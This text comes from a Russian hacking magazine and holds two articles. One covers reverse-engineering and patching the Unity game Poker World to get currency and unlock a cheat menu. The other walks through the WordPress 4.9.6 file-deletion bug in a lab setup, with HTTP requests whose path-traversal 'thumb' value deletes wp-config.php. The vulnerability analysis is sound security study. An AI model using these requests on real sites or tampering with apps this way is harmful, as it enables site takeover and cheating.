Google, и все они, культурно выража ясь, оставля ли желать лучшего. Однако
мои молитвы были услышаны, и я наткнулся на MEmu. На момент написания
статьи последняя версия была 5.5.1. Тут есть все, что тебе может понадо‐
биться. Создавать можно виртуальные машины Android версий 4.4 и 5.1,
а также поддерживается эмуляция нескольких моделей устрой ств.





                 Нас трой ки эмулято ра MEmu 5.5.1

Также тут присутствуют раз ные приятные фишки типа эмуляции камеры, спу‐
финга GPS, мак‐адреса и сотового оператора, и, конечно же, есть поддержка
трехмерной графики, то есть воз можность запус кать игры.
   Что очень важно, MEmu поддерживает уста новку приложений из файлов
APK и, о боги, в нем есть обычные нас тройки сетевого подключения Android.
Это позволяет легко настроить устройство на работу через прокси типа Burp
и перехватывать трафик. Ты удивишься, но часть эмуляторов не поддержи‐
вала работу через прокси и не имела стандартных сетевых нас троек.





              Главный экран эмулятора MEmu после запуска

В общем, пока у меня не воз никало претензий к MEmu. Если ты знаешь
о более достойных вариантах, не стес няй ся и пиши о них в комментариях.
  Еще нам понадобится APK Studio, что бы иметь возможность удобно рас‐
паковывать, пересобирать и подписывать пакеты. Для подписи пакетов
к нему потребуется скачать  uber‐apk‐signer и положить в директорию
C:\Users\<имя_юзера>\.apkstudio\vendor ,  предварительно  переиме‐
новав в uber‐apk‐signer.jar. Также можешь обновить apktool до последней
версии и скопировать в ту же папку.





                    Главное окно утилиты APK Studio

И конечно же, само приложение. Его можно ска чать из Play Market и App
Store, но нам ведь нужен сам дистрибутив. Тут на помощь приходят сай ты —
агрегаторы приложе ний. Такого рода сервисы легко гуглятся по запросу apk
download. Я, например, оста новился на https://apkpure.com/, где помимо
текущей версии приложения мож но скачать и предыдущие (иногда бывает
полезно).
  Переходим по ссылке и ска чиваем нашего подопытного. На момент
написания статьи последняя версия при ложения — 1.3.5.
   Теперь можно установить скачанный apk в эмуляторе. Для этого дос таточ‐
но перетащить его на окно с запущенным MEmu — практичес ки в лучших тра‐
дициях macOS.





               Загрузка игры Poker World 1.3.5 в эмуляторе

На этом этапе базовые приготовления закончены. Обо всех остальных полез‐
ных штуках и утилитах я рас ска жу в процес се препари рования приложе ния.


НАЧИНАЕМ ВЕСЕЛЬЕ В IOS
Так получилось, что играть я начал на айфоне. И где‐то на третьем уровне
денег начало катастрофически не хва тать. Аппа рат был без джейлбрейка,
и делать мне его совершенно не хотелось, поэтому я начал искать баги
в  логике  самого приложения.  Такие,  чтобы можно было провернуть,
не закапываясь в его дебри.
  Парочку таких я и обнаружил. В игре есть возможность раз в четыре часа
крутить одноруко го бандита, из которого тебе рандомно выпадают всякие
ништяки. Их в игре всего два вида — это деньги и билеты. И те и дру гие нужны
для участия в турнирах. Так вот в мес тном ана логе тотализатора можно выиг‐
рать небольшое количество денег или один билетик. Количество денег,
которые ты можешь сру бить, зависит от уровня твоего персонажа. Каждые
несколько уровней суммы выигрыша в этой рулетке удваиваются. На самом
первом они составляют от 400 до 2000 долларов.





            Сво еоб разный однорукий бандит в Poker World

Про билет и 2000 баксов можно забыть, за месяц игры и тысячи кручений
этой рулетки ни разу ничего подобного мне не выпало. Интерес но будет
взглянуть на алго ритм. :)
  Тем не менее через пять таких спинов ты получаешь возможность сделать
джекпот‐спин, в котором все выигрыши умножены на три и, соответственно,
можно урвать аж три билета.





                  Эво люция спинов в Poker World

Баг заключался в том, что время до следующего спи на считалось от установ‐
ленной в системе даты. Поэтому достаточно прос то свернуть приложение,
перевести часы на четыре часа вперед, раз вернуть его и снова крутить
барабан. Так можно делать до бесконечности.
   Чтобы бесконечно не переводить время в будущее, можно сде лать так:
 • сворачиваем приложение, находясь на экра не с таблицей спинов и тай‐
  мером до следующего;
 • переводим часы на четыре часа вперед;
 • разворачиваем, видим, что появилась кнопка Spin Now. Нажимать ее
   не нужно;
 • сворачиваем;
 • переводим время на четыре часа назад;
 • снова разворачиваем и теперь уже нажимаем кнопку.





Я проводил такую процеду ру после каждого джекпот‐спина. Это дает воз‐
можность не ухо дить далеко в будущее, так как от сис темного времени много
чего зависит. Срабатывание алертов, событий в календаре и прочее.
  Вообще, я сильно удивился тому, какие проблемы может вызвать изме‐
нение даты на устрой стве с iOS. Например, пос ле того как я выставил 2030,
меня разлогинил iCloud и отка зывался пус кать обратно с неизвестной ошиб‐
кой. Я уж было подумал, что мой акка унт заб локировали за путешествия
во времени. Повторно авторизовать ся удалось толь ко после перезагрузки
девайса.


             INFO

                     Два года назад в iOS нашли баг: устройство окир‐
                       пичивалось, если поставить дату на 1970 год.
                  Можно предположить, что от системной даты
                     многое зависит.


Плюс сама смена даты неудобна — чтобы сменить год, нужно прокрутить
все 365 дней. Вот и сиди, вози пальцем как сумас шедший.
  Помимо бесплатных спинов, имеются еще игры без вложений, которые
тоже доступны каждые четыре часа. В цепочке — пять игр, в каждой ты
можешь выиграть определенную сумму, причем чем дальше по цепочке ты
проходишь, тем больше куш. Приз за выигрыш в последней — один билет.





               Эво люция бесплатных игр в Poker World

Ускорить можно точ но таким же способом — изменение системного вре‐
мени. К слову сказать, этот стандартный финт с переводом часов еще много
где прокатывает, не стес няйся и чекай в тех приложениях, где предлагают
чего‐то подождать. :)
  Но это все цветочки. У меня завалялся ста рый джейлбрейкнутый айфон,
а это значит, что настало время заг лянуть поглубже в нед ра игры и пос‐
мотреть, что там творится. Запус каю утилиту Filza и смотрю, где располага‐
ются файлы приложения. У меня это /path. Немного покопавшись, я обна‐
ружил интересный файл com.youdagames.pokerworld.plist.





          Ин тересный файл с нас тройками игры Poker World

Сам файловый менеджер Filza поз воляет открывать, редактировать и сох‐
ранять файлы plist. В нем располага ются раз ные настрой ки, которые каса‐
ются игры в целом и текущего пользователя в частнос ти. Мой взгляд зацепил‐
ся за парочку интересных именованных переменных: UserChips и UserTick‐
ets. И да, они означают именно то, что ты подумал. Это количес тво твоих
денег (фишек) и билетов. Я поменял значения на нужные и запустил игру.





    Редактирование количес тва денег и билетов у игрока в Poker World





                Добавили себе фишек и билетов

И вуаля! Виртуальный миллионер. Помимо этого, в файле находится куча
интересных параметров — таких как текущий уровень игрока, его позиция
в десятке лидеров, какие уровни уже прой дены, лимиты столов и прочее. Если
будет инте ресно, то можешь поэкспериментировать на досуге, а я перехожу
к версии приложения для Android и более увлекатель ным вещам.


ВЛАСТВУЕМ В POKER WORLD ДЛЯ ANDROID
Первым делом точно так же проверя ем домашнюю папку при ложе ния.
Не лежат ли там какие‐нибудь интерес ные фай лы? Для этих целей я вос поль‐
зуюсь  файловым  менеджером  из  CyanogenMod  и  перейду  в  папку
/data/data/com.youdagames.pokerworld/shared_prefs/ .





              Домаш няя папка Poker World в Android

Сразу же бросается в глаза файл com.youdagames.pokerworld.v2.player‐
prefs.xml. Откроем его и убедимся: там все то же самое, что и в iOS, только
в формате XML.





             Файл с настройками Poker World на Android

Но мы это уже проходили, так что ценность этой находки для нас минимальна.
Пойдем чуть дальше.
  Попробуем декомпилировать apk‐файл с игрой. Для этих целей я почти
всегда      исполь зую     замечательный     онлайновый     сервис
javadecompilers.com/apk. Кста ти, помимо приложений для Android, он может
декомпилировать файлы JAR, причем раз ными методами. На выбор деком‐
пиляторы JDCore, CFR, Jadx и дру гие.





        Возможные декомпиляторы на сайте javadecompilers.com

В общем, декомпильнули наш файл, скачали его, распаковали и видим, что
ничего особо интересного там нет. Печаль.
   Также есть целый фреймворк, который неплохо помогает в исследовании
мобильных приложений, он называется Mobile Security Framework, MobSF. Он
тоже выполняет декомпиляцию приложения и ищет в получившихся исходни‐
ках всякие интересные вещи и потенциальные уязвимости. Рекомендую
не брезговать им и натравливать его на исследуемые приложения. Фрей‐
мворк легко устанавливается и, помимо этого, существует в виде контейнера
Docker, что сводит его установку к одной команде.


> docker run ‐it ‐p 8000:8000 opensecurity/mobile‐security‐framework‐
mobsf:latest

Но нам это тоже не поможет. :) У нас здесь игра на движке Unity, на что нед‐
вусмысленно намекает наличие характерных фай лов.





                  Игра Poker World написана на Unity

Я, конечно же, слышал про этот игровой движок, но никогда не приходилось
иметь с ним дело в плане реверса. Немного покурив мануалы, я узнал, что
все самое интересное обычно находится в фай лах Assembly‐CSharp.dll,
Assembly‐CSharp‐firstpass.dll и Assembly‐UnityScript.dll из папки
Managed. Как видно из наз вания, они написаны на C#, поэтому нам нужен
соответствующий декомпилятор. Есть нес колько классных вариантов, сре ди
них ILSpy и DotPeek. Обе утилиты абсо лютно бес платны и име ют свои фишки;
я остановился на ILSpy. Откро ем в нем Assembly‐CSharp.dll и Assembly‐
CSharp‐firstpass.dll.





          Декомпиляция Unity‐файлов из Poker World в ILSpy



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      ALL IN ПО ФАНУ
                         КАК РАЗОБРАТЬ, ИЗМЕНИТЬ
            И СОБРАТЬ ОБРАТНО МОБИЛЬНУЮ ИГРУ
                                     НА UNITY




Разворачиваем дерево файла Assembly‐CSharp.dll и наб людаем огромное
количество классов с интересными названиями. Это абсолютна вся логика
игры. Есть где развернуться!
  Но как вносить изменения, чтобы можно было их сохранить? Первый вари‐
ант — это экспортировать исходники, отредактировать и попробовать ском‐
пилировать их обратно в библиотеку. Думаю, что при таком раскладе понадо‐
бится устранить кучу зависимос тей и возникнет немало подводных камней,
которые отнимут значительное количес тво времени — результат просто того
не стоит.
  Сначала я было расс троился, но, немного погуг лив, я нашел отличное
решение. При помощи утилиты под названием dnSpy мы можем вносить
изменения напрямую в DLL, причем так, как если бы мы просто редактирова‐
ли ее код на C#. Просто магия вне Хогвартса! :)
   Скачиваем программу и открываем наши биб лиотеки в ней.





          Декомпиляция файлов Unity из Poker World в dnSpy

Если встроенный редактор покажется тебе недостаточно удобным, можешь
сохранить все исходники как про ект и пользоваться привычным. Для этого
в меню File имеется команда Export to Project.
  Сначала изменим что‐нибудь прос тое, чтобы понять, сработает ли. Нап‐
ример, я нашел класс, который отвечает за отоб ражение меню настроек
игры. В нем есть метод Show(), который отра баты вает при нажатии на кнопку
настроек.


/Assembly-CSharp/SettingsMenu.cs
088: // Token: 0x06001AE2 RID: 6882 RVA: 0x00079D30 File Offset:
0x00078130
089: public override void Show(params object[] args)
090: {
091:   base.Show(args);
092:   this.facebookText.text = this.GetFacebookText();
093:   base.StartCoroutine(this.Animate());
094:   this._data = GameManager.Instance.LoadSettings();
...
110:   string str = (!GameManager.Instance.cheatsEnabled) ? string.
Empty : " | cheats";
111:   string str2 = (!GameManager.Instance.releaseBuild) ? " |
debug" : string.Empty;
112:   this.version.text = "v" + Application.version + str2 + str;

Здесь задается переменная this.version.text, которая содержит номер
текущей версии игры. Он выводится в левом нижнем углу на экране нас троек.





                   Экран нас троек в Poker World

Добавим к этой строчке что‐нибудь свое. Для этого нужно кликнуть правой
кнопкой мыши внутри метода и выбрать пункт меню  Edit Method (C#)
или просто нажать Ctrl‐Shift‐E.





                Контекстное меню выб ранного метода

Откроется окно для внесения изменений толь ко в выбранный метод. Ты
можешь выбрать Edit Class (C#) и редактировать весь класс целиком, но сей‐
час нам это не нужно.





          Окно редактирова ния выб ранного метода в dnSpy

Я добавил перемен ную str3, в которой написал небольшое при ветствие.


/Assembly-CSharp/SettingsMenu.cs
111: string str2 = (!GameManager.Instance.releaseBuild) ? " | debug"
: string.Empty;
112: string str3 = " | Hello from dnSpy";
113: this.version.text = "v" + Application.version + str2 + str +
str3;

После этого нажимаем кноп ку Compile. Тут компилятор может вернуть ошиб‐
ки.





              Ошибки компиляции метода в dnSpy

Не будем сильно вдаваться в суть ошибок; посмотрим лучше на место, где
они обнаружились. Видишь то же самое имя файла, который мы редактиру ем,
только с постфиксом g? Это означает global, то есть ошибки (по мнению ком‐
пилятора dnSpy) содержит основной файл класса. Но мы ведь изме няем
лишь один метод, а значит, этими ошиб ками можно спокойно пре небречь.
Поэтому двойным кликом по сообщению об ошиб ке переходим в место, где
они обитают, и просто комментируем неугодные стро ки.





             Устраняем ошиб ки компиляции метода в dnSpy

После этих действий компиляция прош ла успешно. Теперь можешь пос‐
мотреть в начало класса и заметить, что те строки, что мы комментировали,
находятся в изначальном сос тоянии.





            Состояние клас са пос ле рекомпиляции метода

Метод перекомпилирован, теперь идем в меню File и выбираем Save Module.
   Таким образом, у нас появилась обновлен ная DLL. Осталось собрать все
обратно в APK, чтобы запус тить на телефоне. Хоть APK — это обычный архив
ZIP, но просто запаковать и изменить рас ширение недостаточно. Нужен вер‐
ный манифест‐файл и пра виль ная подпись.
  В этих делах нам поможет утилита APK Studio. Откроем APK с игрой и рас‐
пакуем в какую‐нибудь папку при помощи пункта меню File → Open → APK.





                Меню File утилиты APK Studio

В опциях открытия файла в Project Path ука зываем путь, куда складывать рас‐
пакованные данные. Также можешь убрать галочки с пунктов Decompile
Source и Decode Resources, так как нам не нуж но декомпилировать исходники
и декодировать ресурсы приложения.





                Нас трой ки декодирова ния APK‐файла

Теперь жмем Decode и переходим в папку с рас пакованным приложением.
Копируем отредактированный DLL (Assembly‐CSharp.dll) в /assets/bin/
Data/Managed с заменой существу ющей. Снова идем в APK Studio и жмем
F5 или выбираем пункт Build из меню Project. В директории, где лежит содер‐
жимое APK, появится соб ранная версия. Но просто так установить ее
не получится. Остался еще один шаг — подпись.
  Сначала нужно сгенерировать ключ. Это мож но сделать с помощью вхо‐
дящей в состав Java утилиты keytool. Для создания выполним следующую
команду:


> keytool.exe ‐genkey ‐keystore <имя_контейнера> ‐storepass <пароль>
‐alias <имя_ключа> ‐validity <срок_действия_в_днях> ‐keyalg RSA ‐
storetype pkcs12





                 Создание ключа для подписи APK

Возвращаемся в APK Studio, переходим в меню Project → Sign/Export.
Выбираем све жесозданный контейнер и указыва ем пароль к нему, название
клю ча и его пароль.





                Выбор ключа для подписи APK

Нажимаем Sign. Программа немного подумает и скажет, что все прошло
успешно.





                       Ус пешная подпись APK

Вот теперь можно устанавливать получившееся при ложе ние. Запус каем его,
переходим в настрой ки и видим, что наша строка кра суется рядом с версией
приложения.





           Изменили логику работы приложения Poker World

Ну что, теперь пора брать ся за дела покруче, чем простое добавление стро‐
чек.
  Немного побродив по исходникам, я наткнулся на инте ресные классы
Cheat и CheatMenu. Это менюшка с читами, и, судя по методам, есть очень
интересные: выиграть текущую игру, показать карты соперников, выиграть
текущую игровую зону.


/Assembly-CSharp/CheatMenu.cs
008: public class CheatMenu : MonoBehaviour
009: {
...
169:  public void WinPoker(int place)
...
189:  public void ShowCards()
...
199:  public void CompleteCluster(int clusterNumber)

Посмотрим в метод Start, чтобы узнать, какой код выпол няется при запус ке.


109: private void Start()
110: {
111:   this.Init();
112: }

В методе Init происходит инициализация меню.


079: private void Init()
080: {
081:   if (CheatCamera.instance == null)
082:   {
083:     return;
084:   }
085:   if (this.transformsToTouch == null || this.transformsToTouch.
Length == 0 || this.transformsToTouch[0] == null)
086:   {
087:     this.transformsToTouch = CheatCamera.instance.transf
ormsToTouch;
088:   }
089:   this.pointsToTouch = new Vector3[this.transformsToTouch.Length
];
090:   for (int i = 0; i < this.pointsToTouch.Length; i++)
091:   {
092:     this.pointsToTouch[i] = this.transformsToTouch[i].position;
093:   }
094:   if (GameManager.Instance.releaseBuild)
095:   {
096:     base.gameObject.SetActive(false);
097:   }
098:   else if (GameManager.Instance.cheatsEnabled)
099:   {
100:     base.gameObject.SetActive(true);
101:   }
102:   else
103:   {
104:     base.gameObject.SetActive(false);
105:   }
106: }

Пробежав шись по коду, понимаем, что менюш ка не работает на релизных
версиях приложения. Досадно. Давай исправим это.


79: private void Init()
80: {
81:   if (CheatCamera.instance == null)
82:   {
83:     return;
84:   }
85:   if (this.transformsToTouch == null || this.transformsToTouch.
Length == 0 || this.transformsToTouch[0] == null)
86:   {
87:     this.transformsToTouch = CheatCamera.instance.transf
ormsToTouch;
88:   }
89:   this.pointsToTouch = new Vector3[this.transformsToTouch.Length]
;
90:   for (int i = 0; i < this.pointsToTouch.Length; i++)
91:   {
92:     this.pointsToTouch[i] = this.transformsToTouch[i].position;
93:   }
94:   base.gameObject.SetActive(true);
95: }

Однако просто активировать чит‐меню недостаточно. Обрати внимание
на метод Update.


104: private void Update()
105: {
106:   if (CheatCamera.instance == null)
107:   {
108:     return;
109:   }
110:   this.CheckTouches();
111: }

Каждый раз вызывается CheckTouches.


114: private void CheckTouches()
115: {
116:   if (Input.touchCount >= this.pointsToTouch.Length)
117:   {
118:     Touch[] touches = Input.touches;
119:     this.pointsTouched = new bool[touches.Length];
120:     for (int i = 0; i < touches.Length; i++)
121:     {
122:       Vector3 vector = CheatCamera.instance.GetComponent<Camera>
().ScreenToWorldPoint(touches[i].position);
123:       Vector3 a = new Vector3(vector.x, vector.y, 0f);
124:       foreach (Vector3 b in this.pointsToTouch)
125:       {
126:         if (Vector3.Distance(a, b) <= 1f)
127:         {
128:           this.pointsTouched[i] = true;
129:         }
130:       }
131:     }
132:     for (int k = 0; k < this.pointsTouched.Length; k++)
133:     {
134:       if (!this.pointsTouched[k])
135:       {
136:         return;
137:       }
138:     }
139:     this.cheats.gameObject.SetActive(true);
140:     return;
141:   }
142: }

Судя по телу этого метода, чтобы менюшка показалась, следует тапнуть
в нужных местах. Давай сделаем, что бы она открывалась сразу после заг‐
рузки приложения.


79: private void Init()
80: {
81:   if (CheatCamera.instance == null)
82:   {
83:     return;
84:   }
85:   if (this.transformsToTouch == null || this.transformsToTouch.
Length == 0 || this.transformsToTouch[0] == null)
86:   {
87:     this.transformsToTouch = CheatCamera.instance.transf
ormsToTouch;
88:   }
89:   this.pointsToTouch = new Vector3[this.transformsToTouch.Length]
;
90:   for (int i = 0; i < this.pointsToTouch.Length; i++)
91:   {
92:     this.pointsToTouch[i] = this.transformsToTouch[i].position;
93:   }
94:   base.gameObject.SetActive(true);
95:   this.cheats.gameObject.SetActive(true);
96: }

Сохраняем, билдим, подписываем,  уста навливаем,  запус каем и видим
чит‐меню. Можно убе диться, что все кнопочки рабочие.





                 Активированное чит‐меню в Poker World

Но что‐то я не вижу в нем самой интерес ной функции — показать карты
соперников. Нужно исправлять это досадное упущение. Посмотрим, как выг‐
лядит экран во время игры.





                     Игра за сто лом Poker World

В левом нижнем углу есть кнопочка с символом ?, которая показывает, какие
карты были на руках в последней раздаче. Давай изменим ее функцию
на показ карт соперников. Для это го найдем код, который отвечает за клик
по этой кнопке.


/Assembly-CSharp/LastHandMenuButton.cs
05: public class LastHandMenuButton : MonoBehaviour
06: {
07:   // Token: 0x0600192D RID: 6445 RVA: 0x0006CF11 File Offset:
0x0006B311
08:   public void OnClick()
09:   {
10:     MenuManager.Instance.Show<LastHandMenu>(new object[0]);
11:   }
12: }

Пересобираем приложение, и теперь при нажатии на нужную кнопку будут
показываться карты противников.





               Смотрим карты соперника в Poker World





Получается, ты можешь почти полностью менять логику работы приложения.
Можно добавлять фишки пря мо при игре на столе, можно выкидывать ботов,
влиять на алгоритм раздачи карт и тому подоб ное.


ВЫВОДЫ
Благодаря таким манипуляциям можно «подпра вить» почти любую игру,
написанную на Unity, а это, как ты знаешь, очень и очень популярный дви жок.
У dnSpy есть даже специальные билды биб лиотеки Mono.dll. Заменив ори‐
гинальную  версию  такой  библиотеки, можно  отлаживать  приложение
с помощью встроенного в dnSpy дебаггера. Очень удобная вещь.
   Лично я получил немало удовольствия от того, что разобрался в логике
работы приложения. Надеюсь, тебе тоже понравилось!
ВЗЛОМ

  УДАЛЕННОЕ
  УДАЛЕНИЕ
       КАК ЗАХВАТИТЬ КОНТРОЛЬ
    НАД WORDPRESS, ЗАСТАВИВ ЕГО
            СТЕРЕТЬ ФАЙЛ





                aLLy
               ONsec
               @iamsecurity




В WordPress, самой популярной в мире сис теме публикации,
была обнаружена серьезная уязвимость. Она поз воляет
в пару запросов удалить любой файл, доступный для записи
пользователю, от которого работает PHP, а затем получить
контроль над сайтом. В этой статье мы разберемся с при‐
чинами и посмотрим, как работа ет эксплуатация.


Баг был обнаружен еще 20 ноября 2017 года исследователем Славко Михай‐
льоски (Slavco Mihajloski) из RIPS Tech, но вплоть до версии 4.9.7, которая
вышла 5 июня 2018 года, проблема оставалась незапатченной. То есть
на  протяжении  семи  месяцев  она  представляла  серьезную  угрозу
для безопасности на огромном количес тве сайтов по всему миру и на многих
из них продолжает представлять.


СТЕНД
Чтобы разобрать уязвимость, нам сна чала понадобится уязвимый WordPress.
Первым делом ставим контейнер с базой данных.


$ docker run ‐d ‐‐rm ‐e MYSQL_USER="wpdel" ‐e MYSQL_PASSWORD="4hicmM
RyUq" ‐e MYSQL_DATABASE="wpdel" ‐‐name=mysql ‐‐hostname=mysql mysql/
mysql‐server

Теперь контейнер, на который пос тавим веб‐сервер. На нем будет рас‐
полагаться WordPress.


$ docker run ‐it ‐‐rm ‐p80:80 ‐‐name=wpdel ‐‐hostname=wpdel ‐‐link=
mysql debian /bin/bash

Установим все нужные пакеты и рас ширения PHP.


$ apt‐get update && apt‐get install ‐y apache2 php php7.0‐mysqli
php‐gd nano wget

Уязвима версия CMS под номером 4.9.6, ее и скачаем.


$ cd /tmp && wget https://wordpress.org/wordpress‐4.9.6.tar.gz
$ tar xzf wordpress‐4.9.6.tar.gz
$ rm ‐rf /var/www/html/* && mv wordpress/* /var/www/html/
$ chown ‐R www‐data:www‐data /var/www/html/

Запускаем сервис apache2.


$ service apache2 start

Теперь устанавливаем WordPress, используем наш MySQL‐сервер в качестве
БД.





                  Ин сталляция WordPress 4.9.6

Уязвим механизм удаления загруженных фай лов, поэтому для успешной экс‐
плуатации юзер дол жен иметь привилегии на удаление медиа. Создадим
такого пользователя.





  Создание пользователя с привилегиями добавления медиафайлов
  в WordPress 4.9.6



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

 УДАЛЕННОЕ УДАЛЕНИЕ
           КАК ЗАХВАТИТЬ КОНТРОЛЬ НАД WORDPRESS,
                     ЗАСТАВИВ ЕГО СТЕРЕТЬ ФАЙЛ





АНАЛИЗ УЯЗВИМОСТИ
В WordPress, как и в любой уважающей себя CMS, можно загружать про‐
извольные файлы и встра ивать их в публику емые посты. Самый оче видный
способ примене ния — это добавление фотографий. Если файл загруженной
картинки больше установленных в нас тройках размеров, то для него создают‐
ся миниатюры (thumbnails). Самую мелкую из них можно увидеть при нажатии
на кнопку редактирования картинки (в закладке медиа в разделе Thumbnail
Settings).





          Редактирова ние загруженной картинки в WordPress

Заглянем в файл post.php, где находится  кусок  кода,  ответственный
за редактирование любой записи в системе. Да, аттачи тоже считаются
записями.


/wordpress/wp-admin/post.php
33: if ( $post_id )
34:     $post = get_post( $post_id );
...
62: switch($action) {

В переменной $action находится дей ствие из запроса, которое нужно
выпол нить. Оператор switch перенаправляет выполнение скрипта в нужную
часть кода. Вот, к примеру, запрос на редактирова ние конкретной записи.


GET /wp‐admin/post.php?post=25&action=edit HTTP/1.1
Host: wpdel.visualhack
User‐Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/
537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/
webp,image/apng,*/*;q=0.8
Accept‐Encoding: gzip, deflate
Accept‐Language: ru‐RU,ru;q=0.9,en‐US;q=0.8,en;q=0.7,bg;q=0.6,uk;q=0.
5,hu;q=0.4

При его обработке исполняется следующий кусок кода:


062: switch($action) {
...
098: case 'edit':
099:    $editing = true;
...
122:    if ( ! empty( $_GET['get‐post‐lock'] ) ) {
123:        check_admin_referer( 'lock‐post_' . $post_id );
124:        wp_set_post_lock( $post_id );
125:        wp_redirect( get_edit_post_link( $post_id, 'url' ) );
126:        exit();
127:    }
128:
129:    $post_type = $post‐>post_type;
130:    if ( 'post' == $post_type ) {
131:        $parent_file = "edit.php";
132:        $submenu_file = "edit.php";
133:        $post_new_file = "post‐new.php";
134:    } elseif ( 'attachment' == $post_type ) {
135:        $parent_file = 'upload.php';
136:        $submenu_file = 'upload.php';
137:        $post_new_file = 'media‐new.php';
138:    } else {
139:        if ( isset( $post_type_object ) && $post_type_object‐>
show_in_menu && $post_type_object‐>show_in_menu !== true )
140:            $parent_file = $post_type_object‐>show_in_menu;
141:        else
142:            $parent_file = "edit.php?post_type=$post_type";
143:        $submenu_file = "edit.php?post_type=$post_type";
144:        $post_new_file = "post‐new.php?post_type=$post_type";
145:    }
146:
...
174:    include( ABSPATH . 'wp‐admin/edit‐form‐advanced.php' );
175:
176:    break;

Погуляв немного по этой ветке кода, можно обнаружить довольно любопыт‐
ный экшен.


178: case 'editattachment':
179:    check_admin_referer('update‐post_' . $post_id);
180:
181:    // Don’t let these be changed
182:    unset($_POST['guid']);
183:    $_POST['post_type'] = 'attachment';
184:
185:    // Update the thumbnail filename
186:    $newmeta = wp_get_attachment_metadata( $post_id, true );
187:    $newmeta['thumb'] = $_POST['thumb'];
188:
189:    wp_update_attachment_metadata( $post_id, $newmeta );

Особенно интересен раз дел Update the thumbnail ﬁlename. Переменная
$newmeta содержит метаданные записи с ука занным ID. Ключ thumb содержит
путь до миниатю ры, и его зна чение мож но изменить с помощью параметра
thumb в POST‐запросе. Эти данные ухо дят в функцию wp_update_attachmen‐
t_metadata, которая рас положилась чуть ниже в этом же файле.


5138: function wp_update_attachment_metadata( $attachment_id, $data )
 {
5139:   $attachment_id = (int) $attachment_id;
5140:   if ( ! $post = get_post( $attachment_id ) ) {
5141:       return false;
5142:   }
...
5152:   if ( $data = apply_filters( 'wp_update_attachment_metadata',
$data, $post‐>ID ) )
5153:       return update_post_meta( $post‐>ID, '_wp_attachment_
metadata', $data );

После успешного применения фильтра с аналогичным функции названием
выпол нение передается в update_post_meta.


1858: function update_post_meta( $post_id, $meta_key, $meta_value, $
prev_value = '' ) {
1859:   // Make sure meta is added to the post, not a revision
1860:   if ( $the_post = wp_is_post_revision($post_id) )
1861:       $post_id = $the_post;
1862:
1863:   $updated = update_metadata( 'post', $post_id, $meta_key, $
meta_value, $prev_value );

Дальше вызывается функция update_metadata, которая выполняет сох‐
ранение переданных данных в базу.


/wordpress/wp-includes/meta.php
143: function update_metadata($meta_type, $object_id, $meta_key, $
meta_value, $prev_value = '') {
144:    global $wpdb;
...
200:    $meta_ids = $wpdb‐>get_col( $wpdb‐>prepare( "SELECT $id_col
umn FROM $table WHERE meta_key = %s AND $column = %d", $meta_key, $
object_id ) );
201:    if ( empty( $meta_ids ) ) {
202:        return add_metadata( $meta_type, $object_id, $raw_me
ta_key, $passed_value );
203:    }
...
247:    $result = $wpdb‐>update( $table, $data, $where );
248:    if ( ! $result )
249:        return false;

Попробуем отправить запрос и посмотреть, запишет ся ли нас тройка в базу
данных.
   Как ты, наверное, зна ешь, в WordPress присутс твует защита от CSRF,
которая сводится к использованию параметра _wpnonce в каждом запросе.
Валидный можно взять на странице редактирова ния записи.
   ID нашей загруженной картинки — 26, поэтому запрос будет иметь сле‐
дующий вид.


POST /wp‐admin/post.php?post=26 HTTP/1.1
Host: wpdel.visualhack
Content‐Length: 68
Accept: */*
Content‐Type: application/x‐www‐form‐urlencoded; charset=UTF‐8
Referer: http://wpdel.visualhack/wp‐admin/post.php?post=26&
action=edit
Cookie: <валидные_куки>
post_id=26&thumb=test/this&action=editattachment&_wpnonce=<валидный_
токен>





          Отправка тестового запроса на экшен editattachment

После этого заглянем в таблицу wp_postmeta и убедимся, что переданный
параметр записался.





       Записали атрибут thumb в метаданные загруженного фай ла

Теперь посмотрим, что происходит при удалении нашей картинки. Запрос
на удаление обрабатывается той же веткой со switch, за это отвечает экшен
delete.


/wordpress/wp-admin/post.php
246: case 'delete':
...
258:    if ( $post‐>post_type == 'attachment' ) {
259:        $force = ( ! MEDIA_TRASH );
260:        if ( ! wp_delete_attachment( $post_id, $force ) )
261:            wp_die( __( 'Error in deleting.' ) );

Если удаляемая запись является загруженным файлом, то выполняется
wp_delete_attachment.


4993: function wp_delete_attachment( $post_id, $force_delete = false
) {
4994:   global $wpdb;
...
5015:   $meta = wp_get_attachment_metadata( $post_id );
...
5061:   if ( ! empty($meta['thumb']) ) {
5062:       // Don’t delete the thumb if another attachment uses it
5063:       if (! $wpdb‐>get_row( $wpdb‐>prepare( "SELECT meta_id
FROM $wpdb‐>postmeta WHERE meta_key = '_wp_attachment_metadata' AND
meta_value LIKE %s AND post_id <> %d", '%' . $wpdb‐>esc_like( $meta['
thumb'] ) . '%', $post_id)) ) {
5064:           $thumbfile = str_replace(basename($file), $meta['
thumb'], $file);
5065:           /** This filter is documented in wp‐includes/functi
ons.php */
5066:           $thumbfile = apply_filters( 'wp_delete_file', $thumbf
ile );
5067:           @ unlink( path_join($uploadpath['basedir'], $thumbf
ile) );
5068:       }
5069:   }

Итак, если thumb установлен, то, помимо самих файлов с картинками, уда‐
ляется файл, путь до которого указан в thumb. То есть мы можем передать
путь до произвольного файла и воспользоваться этим механизмом, чтобы
удалить его.
  По умолчанию файлы складываются в /wp‐content/uploads/<год>/<
месяц>/, где год и месяц зависят от времени заг рузки фай ла. Это и есть та
директория,  от  которой  нужно  отталки ваться.  Таким  образом,  путь
../../../../ приведет нас в кор невую директорию установленного Word‐
Press. А что инте ресного у нас в ней находится? Правильно, файл wp‐config.
php. Если удалить его, то система будет думать, что мы еще не выполнили
установку CMS.
  Попробуем это провернуть. Сна чала сохраняем путь до файла в базе дан‐
ных.


POST /wp‐admin/post.php?post=26 HTTP/1.1
Host: wpdel.visualhack
Content‐Length: 68
Accept: */*
Content‐Type: application/x‐www‐form‐urlencoded; charset=UTF‐8
Referer: http://wpdel.visualhack/wp‐admin/post.php?post=26&
action=edit
Cookie: <валидные_куки>
post_id=26&thumb=../../../../wp‐config.php&action=editattachment&
_wpnonce=<валидный_токен>

А теперь нажимаем на кнопку уда ления атта ча, и — бам! — нас перекидывает
на страницу установки WordPress. Так как этот параметр абсолютно никак
не проверялся и не фильтровался, файл был успешно удален.
